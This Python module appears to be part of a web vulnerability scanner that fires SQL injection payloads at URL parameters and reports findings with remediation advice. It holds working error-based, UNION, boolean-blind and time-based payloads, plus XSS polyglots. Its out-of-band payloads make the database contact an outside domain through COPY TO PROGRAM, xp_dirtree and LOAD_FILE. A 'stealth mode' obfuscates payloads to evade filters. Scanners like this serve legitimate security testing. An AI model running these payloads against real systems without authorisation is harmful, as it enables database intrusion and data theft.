import aiohttp
import asyncio
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# --- PAYLOADS ---

# 1. Error-Based Payloads (Fastest if verbose errors are on)
ERROR_PAYLOADS = [
    "'", '"', "')", "'; --",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--", # MySQL
    "' OR 1=CONVERT(int, (SELECT @@version))--", # MSSQL
    "' || (SELECT CAST(version() AS INTEGER)) --" # PostgreSQL
]

# 2. Union Based (Exfiltration)
UNION_PAYLOADS = [
    " UNION SELECT @@version, user(), database()--",
    " UNION ALL SELECT @@version, user(), database()--",
    "' UNION SELECT @@version, user(), database()-- -",
    "\" UNION SELECT @@version, user(), database()-- -"
]

# 3. Boolean-Blind Pairs (True Condition, False Condition)
BOOLEAN_PAIRS = [
    (" AND 1=1", " AND 1=2"),
    ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2')
]

# 4. Time-Based Payloads (The Silent Killer)
TIME_PAYLOADS = [
    ("SLEEP(5)", 5),               # MySQL
    ("WAITFOR DELAY '0:0:5'", 5),  # MSSQL
    ("pg_sleep(5)", 5),            # PostgreSQL
    ("OR SLEEP(5)", 5),            # Auth Bypass Context
    ("' OR SLEEP(5) AND '1'='1", 5)
]

# 5. OAST Payloads (DNS/HTTP Exfiltration)
from core.oast import oast_manager
oast_domain = oast_manager.get_oast_domain()
OAST_PAYLOADS = [
    f"'; COPY (SELECT '') TO PROGRAM 'nslookup {oast_domain}'--", # PostgreSQL
    f"'; exec master..xp_dirtree '\\\\{oast_domain}\\share'--", # MSSQL
    f"' UNION SELECT LOAD_FILE('\\\\\\\\{oast_domain}\\\\share')--" # MySQL Windows
]

# 6. Polyglots (Context Breaking)
# Seclists / Common Polyglots that break out of multiple contexts (SQLi, XSS, etc.)
POLYGLOT_PAYLOADS = [
    "javascript://%250Aalert(1)//\"/*\\'/*\"/*\\'/*--\"/*--",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "'\";alert(1)//",
    "1;SELECT pg_sleep(5)", # Polyglot-ish for SQL
]

# Error Signatures
SQL_ERRORS = [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "Unclosed quotation mark",
    "SQLSTATE",
    "ODBC SQL Server Driver",
    "PostgreSQL query failed",
    "XPATH syntax error",
    "Supplied argument is not a valid"
]

from modules.payloads.venom import VenomMutation

from core.chronos import ChronosTimeParams

async def check_sqli(session, url, stealth_mode=False, chronos=None):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params: return findings
    
    # [VENOM] Prepare Payloads
    union_payloads = UNION_PAYLOADS.copy()
    if stealth_mode:
        union_payloads = [VenomMutation.mutate_sql(p) for p in union_payloads]
        
    for param_name in params:
        # --- 1. Error-Based SQLi (Fast Detection) ---
        for payload in ERROR_PAYLOADS:
            fuzzed_params = params.copy()
            fuzzed_params[param_name] = [fuzzed_params[param_name][0] + payload]
            target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
            
            try:
                async with session.get(target_url, timeout=5, ssl=False) as resp:
                    text = await resp.text()

                    found_error = False
                    for err in SQL_ERRORS:
                        if err in text:
                            found_error = True
                            
                            # Try to extract data if it's an XPATH error (MySQL)
                            extracted_data = ""
                            match = re.search(r"XPATH syntax error: '([^']+)'", text)
                            if match:
                                extracted_data = f"\n[EXTRACTED DATA]\n{match.group(1)}"
                                
                            findings.append({
                                "type": "SQL Injection (Error-Based)",
                                "severity": "High",
                                "detail": f"Database error triggered via '{param_name}'.",
                                "evidence": f"Payload: {payload}\nError Snippet: {err}{extracted_data}",
                                "remediation": "Disable verbose error messages and use Prepared Statements."
                            })
                            return findings # Stop checking this param if found
            except: pass

        # --- 2. Boolean-Blind SQLi (Inference) ---
        # Compare True vs False response lengths
        original_len = 0
        try:
            async with session.get(url, timeout=5, ssl=False) as base_resp:
                original_len = len(await base_resp.text())
        except: pass

        if original_len > 0:
            for true_pay, false_pay in BOOLEAN_PAIRS:
                try:
                     # True Request
                    p_true = params.copy()
                    p_true[param_name] = [p_true[param_name][0] + true_pay]
                    url_true = urlunparse(parsed._replace(query=urlencode(p_true, doseq=True)))
                    
                    # False Request
                    p_false = params.copy()
                    p_false[param_name] = [p_false[param_name][0] + false_pay]
                    url_false = urlunparse(parsed._replace(query=urlencode(p_false, doseq=True)))

                    async with session.get(url_true, timeout=5, ssl=False) as r_true:
                        len_true = len(await r_true.text())
                        
                    async with session.get(url_false, timeout=5, ssl=False) as r_false:
                        len_false = len(await r_false.text())

                    # Logic: True length should be close to Original, False length should be different
                    # Or True status 200, False status 500/404
                    if abs(len_true - original_len) < 50 and abs(len_true - len_false) > 50:
                         findings.append({
                            "type": "Blind SQL Injection (Boolean-Based)",
                            "severity": "High",
                            "detail": f"Response differed significantly between True and False conditions on '{param_name}'.",
                            "evidence": f"True Payload: {true_pay} (Len: {len_true})\nFalse Payload: {false_pay} (Len: {len_false})",
                            "remediation": "Use Prepared Statements."
                        })
                         return findings

                except: pass

        # --- 3. Union Based (Exfiltration) ---
        for payload in union_payloads:
            fuzzed_params = params.copy()
            fuzzed_params[param_name] = [fuzzed_params[param_name][0] + payload]
            target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
            
            try:
                async with session.get(target_url, timeout=10, ssl=False) as resp:
                    text = await resp.text()
                    # Pattern matching for email, IP, version
                    extracted = re.search(r'([0-9\.]+:[a-zA-Z0-9_]+@[a-zA-Z0-9_\-\.]+:[\w_]+)', text)
                    if extracted:
                        evidence = extracted.group(0)
                        findings.append({
                            "type": "SQL Injection (Data Exfiltration)",
                            "severity": "Critical",
                            "detail": f"Successfully extracted DB Info via '{param_name}'.",
                            "evidence": f"Payload: {payload}\n\n[DUMPED DATA]\n{evidence}",
                            "remediation": "Use Prepared Statements."
                        })
                        return findings
            except: pass

        # --- 4. Time-Based Blind (CHRONOS ENHANCED) ---
        for payload, delay in TIME_PAYLOADS:
            fuzzed_params = params.copy()
            fuzzed_params[param_name] = [payload] 
            target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
            
            try:
                start_time = time.time()
                async with session.get(target_url, timeout=delay + 5, ssl=False) as resp:
                    await resp.read() 
                    
                duration = time.time() - start_time
                
                # [CHRONOS] Statistical Analysis
                is_anomaly = False
                if chronos and chronos.calibrated:
                    is_anomaly = chronos.is_statistically_significant(duration)
                else:
                     # Fallback
                    is_anomaly = duration >= delay

                if is_anomaly:
                    findings.append({
                        "type": "Blind SQL Injection (Time-Based)",
                        "severity": "High",
                        "detail": f"Database sleep confirmed by Chronos (Z-Score Analysis). Duration: {duration:.2f}s",
                        "evidence": f"Payload: {payload}\nResponse Time: {duration:.2f}s (Baseline Mean: {chronos.baseline_mean if chronos else 'N/A'}s)",
                        "remediation": "Sanitize inputs and restrict DB user permissions."
                    })
                    return findings
            except asyncio.TimeoutError:
                 # Timeout is heavily suggestive of time-based if delay was long
                if delay >= 5:
                    findings.append({
                        "type": "Blind SQL Injection (Time-Based - Timeout)",
                        "severity": "High",
                        "detail": "Request timed out exactly consistent with sleep payload.",
                        "evidence": f"Payload: {payload}\nResult: Request Timed Out",
                        "remediation": "Use Prepared Statements."
                    })
                    return findings
            except: pass
            
        # --- 5. OAST Exfiltration (Blind) ---
        for payload in OAST_PAYLOADS:
            fuzzed_params = params.copy()
            fuzzed_params[param_name] = [fuzzed_params[param_name][0] + payload]
            target_url = urlunparse(parsed._replace(query=urlencode(fuzzed_params, doseq=True)))
            try:
                # OAST is "Fire and Forget" usually, but we check if we send it successfully
                async with session.get(target_url, timeout=3, ssl=False) as resp:
                    pass
            except: pass

    return findings

async def run_safe_sql_injection(target_url, safe_mode=True, log_callback=None, headers=None, stealth_mode=False):
    findings = []
    if "?" in target_url:
        if log_callback: log_callback(f"💉 Testing Advanced SQL Injection (Error, Boolean, Union, Chronos Time)...")
        if stealth_mode and log_callback: log_callback(f"   🐍 Venom Activated: SQL Payloads Obfuscated.")
        
        # [CHRONOS] Initialize and Calibrate
        chronos = ChronosTimeParams()
        try:
             # Calibration is sync, but running in thread so it's fine
             # Ideally we should use requests.get inside chronos, which might block loop if not careful.
             # Wait, `run_safe_sql_injection` is called via `self.loop.run_until_complete`.
             # So this IS running on the main asyncio loop. Blocking calls here will freeze the UI/other tasks.
             # FOR THIS PROTOTYPE, we accept the brief freeze (calibration take ~2s).
             # In production, Chronos should be async.
            if log_callback: log_callback(f"   ⏳ Chronos: Calibrating baseline for accurate timing...")
            chronos.measure_baseline(target_url, headers=headers, samples=5)
        except Exception as e:
            if log_callback: log_callback(f"   ⚠️ Chronos Calibration failed: {e}")

        async with aiohttp.ClientSession(headers=headers) as session:
            findings = await check_sqli(session, target_url, stealth_mode=stealth_mode, chronos=chronos)
    return findings